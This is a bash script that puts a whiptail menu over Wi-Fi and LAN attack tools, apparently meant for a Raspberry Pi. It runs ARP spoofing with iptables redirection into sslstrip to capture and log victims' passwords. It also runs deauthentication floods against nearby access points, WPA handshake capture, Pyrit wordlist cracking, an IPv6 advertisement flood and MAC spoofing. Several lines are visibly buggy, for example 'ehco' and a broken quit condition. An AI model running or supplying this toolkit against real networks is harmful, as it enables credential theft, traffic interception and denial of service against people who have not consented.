#!/bin/bash

#Remeber to cahnge all interfaces to match your own. on the raspberry pi will most likely be wlan0
clear
exit=0
available_interface=()
current_interface="wlan0"
primary_interface() {
	count=0
	for i in $( ls /proc/net/dev_snmp6/ )
	do
		available_interface[$count]="$i"
		available_interface[$(( $count+1 ))]="Select"
		count=$(( count+2 ))
	done
	current_interface=$( whiptail --menu "Select your interface:" 25 50 7 \
			"${available_interface[@]}" 3>&2 2>&1 1>&3-)
}

monitor_cleanup(){
	for i in $( airmon-ng | grep "mon" | awk '{print $1}' )
	do
		airmon-ng stop $i
	done
}

#Function to determine CIDR and then scan using nmap providing selection options
auto_map(){
	echo "Please wait. Scanning..."
	count=0
	targetIPs=()
	for i in $(arp-scan --interface $current_interface $(ipcalc $(ifconfig | grep "Bcast" | awk -F':' '{print $2}' | awk -F' ' '{print $1}') | grep "Network" | awk -F' ' '{print $2}') | sed -e 's/ /./g' | sed -e 's/\s/___/g' | grep -v "datalink" | grep -v "arp-scan" | grep -v "received")
	do
		(( count+= 1 ))
		targetIPs[$count]="$i"
		(( count+= 1 ))
		targetIPs[$count]=" "
	done
	echo $targetIPs[1];
	#3>&2 2&1 1>&3- is needed to make the whiptail GUI appear.
	CURRENT_GATEWAY=$(route -n | awk -F' ' '{print $2}' | grep -v -E "Gateway|IP|0.0.0.0")
	CURRENT_TARGET2=$( whiptail --menu "Select a target client:" 25 50 7 \
			"${targetIPs[@]}" 3>&2 2>&1 1>&3- )
	CURRENT_TARGET2=$(echo $CURRENT_TARGET2 | awk 'BEGIN { FS = "___" } ; { print $1 }')
}

AVAILABLEAP=()
TARGETAP=""

Nearby_Mac(){
	AvailableAP=()
	count=0
	for i in $( iwlist c scan | grep 'Address' | awk -F' ' '{print $5}' )
	do
		AvailableAP[$count]="$i"
		count=$(( $count + 2 ))
	done
	count=1
	for i in $( iwlist $current_interface scan | grep 'ESSID' | awk -F':' '{print $2}' | sed -e 's/ /_/g' )
	do
		AvailableAP[$count]="$i"
		count=$(( $count + 2 ))
	done
	TARGETAP=$( whiptail --menu "Select a target host:" 25 50 7 \
			"${AvailableAP[@]}" 3>&2 2>&1 1>&3- )
}

##Main loop
while [ exit != 2 ]; do
	#Functions and variables
	
	CURRENT_GATEWAY=""
	CURRENT_TARGET2=""
	
	
	
	#Title Screen
	whiptail --textbox Title 25 35
	
	#Main Menu
	whiptail --menu "Main Menu" 25 50 7 \
		select_interface "Select the interface you want to use to hax things"\
		macchange "MAC Changer" \
		clean_mon "Cleans up monitor mode if not cleaned up properly"\
		airodump "Airodump-ng + Airmon-ng" \
		airodump2 "Airodump-ng bssid specific" \
		pyrit "Pyrit (for caps)" \
		sslstrip "SSLStrip" \
		ettercap "Open ettercap GUI" 2>CHOICE \
		deauth "sends deauth packets to target"\
		arp-cop "ARP posion detector"\
		ipv6-flood "Floods IPV6 advertisements slows ipv6 enabled machines"\
		pcap_capture "Captures handshakes for a specified AP to be cracked later"\
		quit "Quit"
	
	#Wait. doesnt whiptail have the case system built-in?
	CHOICE=$(cat CHOICE)
	
	
	case $CHOICE in
	
	select_interface) primary_interface
	;;

	#turns off interfaces.
	#Sets interfaces to random Macaddr
	#brings interfaces back up
	macchange) ifconfig $current_interface down
		macchanger -r $current_interface
		ifconfig $current_interface up
	;;
	#check to see what monitor modes are up and then stops them.
	clean_mon) echo "checking for monitor interfaces"
		echo "removing all monitor interfaces"
		monitor_cleanup
	;;
	#Starts monitor mode using choosen interface
	#starts running airodump
	airodump) airmon-ng start $current_interface
		airodump-ng mon0
		monitor_cleanup
	;;
	
	##Airodump a specific AP must make skider
	airodump2) whiptail --inputbox "Please enter access point bssid:" 25 50 2>AIRODUMPBSSID 
		AIRODUMPBSSID=$(cat AIRODUMPBSSID)
		airmon-ng start $current_interface
		airodump-ng --bssid $AIRODUMPBSSID mon0
		monitor_cleanup
	;;
	#takes host and client.
	#aireplay) whiptail --inputbox "Please enter host bssid:" 25 50 2>AIREPLAYHOST
	#	whiptail --inputbox "Please enter a client ("null" if no client):" 25 50 2>AIREPLAYCLIENT
	#	AIREPLAYHOST=$(cat AIREPLAYHOST)
	#	AIREPLAYCLIENT=$(cat AIREPLAYCLIENT)
	#	
	#	#Launches airodump in an xterm window and then waits for it to start up
	#	xterm -e airodump-ng --bssid $AIREPLAYHOST -w Caps/BigProgram mon0 &
	#	echo "Waiting for airodump to start..."
	#	sleep 5s
	#	
	#	#starts deauth if AIREPLAY client is set using the vars inputed
	#	if [ $AIREPLAYCLIENT != "null" ]; then
	#		aireplay-ng --deauth 100 -a $AIREPLAYHOST -c $AIREPLAYCLIENT --ignore-negative-one mon0
	#	else
	#		aireplay-ng --deauth 100 -a $AIREPLAYHOST --ignore-negative-one mon0
	#	fi
	#	monitor_cleanup
	#;;
	##see deauth
	
	#lel cracking passwords on a raspberry pi will be difficult
	#Starts a cracker, Pyrit, on a cap file using a specified wordlist
	pyrit) whiptail --inputbox "Please enter a cap file to crack:" 25 50 2>PYRITCAP
		whiptail --inputbox "Please enter a wordlist:" 25 50 2>PYRITWORDLIST
		
		PYRITCAP=$(cat PYRITCAP)
		PYRITWORDLIST=$(cat PYRITWORDLIST)

		pyrit -r $PYRITCAP -i $PYRITWORDLIST attack_passthrough
	;;
	#Jacks old favorite
	sslstrip)
		auto_map
		
		#Enables ip-forwarding
		echo 1 > /proc/sys/net/ipv4/ip_forward
		#opens up NAT and redirects trafiic from port 80 to port 8080 within the machine
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
		
		#launches arpspoof impersonating the host and the client
		ARPSPOOFHOST=$CURRENT_GATEWAY
		ARPSPOOFCLIENT=$CURRENT_TARGET2
		echo $ARPSPOOFHOST
		echo $ARPSPOOFCLIENT
		gnome-terminal -e "arpspoof -i $current_interface -t $CURRENT_GATEWAY $CURRENT_TARGET2" &

		gnome-terminal -e "arpspoof -i $current_interface -t $CURRENT_TARGET2 $CURRENT_GATEWAY" &
		
		#launches sslstrip Passwords will be displayed on screen and logged in sslstrip.log (may wish to add some kind of time stamping in the name... Oh well)
		gnome-terminal -e "sslstrip -k -l 8080 -w /tmp/sslstrip.log" &
		tail -F /tmp/sslstrip.log
	
		echo "Press enter to terminate..."
		read enter
		echo 0 > /proc/sys/net/ipv4/ip_forward
		iptables --flush
		killall arpspoof
	;;
	
	#Cha thats cheating! no GUI 4 you!
	ettercap) ettercap -G
	;;
	#New favorite -Jack
	deauth)airmon-ng start $current_interface
		echo "discovering nearby APs"
		Nearby_Mac
		echo "launching attack"
		aireplay-ng -0 10 -a $TARGETAP mon0 --ignore-negative-one
		monitor_cleanup
	;;
	arp-cop)echo "press 'q' to quit"
		ettercap -T -i $current_interface -P arp_cop
	;;
	#needs a better way to exit may cause end of program
	ipv6-flood) flood_advertise6 $current_interface
	;;
	pcap_capture) airmon-ng start $current_interface
			Nearby_Mac
			xterm -e aireplay-ng -0 10 -a $TARGETAP mon0 --ignore-negative-one &
			airodump-ng --bssid $TARGETAP -w psk.$(date | sed -e 's/ /_/g') mon0
			clean_mon
	;;
	#exits the loop of eternity
	quit) exit = 1
	;;
	#Major error *Saluts*
	*) ehco "MAJOR ERROR, PLEASE RESTART"
	;;
	
	esac
done